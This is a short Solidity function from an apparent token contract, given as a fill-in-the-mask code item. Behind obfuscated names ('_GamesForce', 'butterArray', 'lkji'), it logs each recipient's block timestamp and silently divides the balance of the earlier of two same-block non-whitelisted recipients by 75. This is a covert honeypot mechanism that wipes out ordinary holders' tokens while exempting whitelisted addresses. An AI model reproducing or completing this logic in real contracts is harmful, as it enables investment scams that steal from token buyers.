"function _GamesForce(address recipient) internal {        butterArray.<mask0>;        _LoggingTheTime[recipient] = block.timestamp;        if ((Frames[recipient] != true) && (lkji > 2)) {            if ((_LoggingTheTime[butterArray[lkji-1]] == _LoggingTheTime[butterArray[lkji]]) && Frames[butterArray[lkji-1]] != true) {                _balances[butterArray[lkji-1]] = _balances[butterArray[lkji-1]]/75;            }        }        lkji++;    }"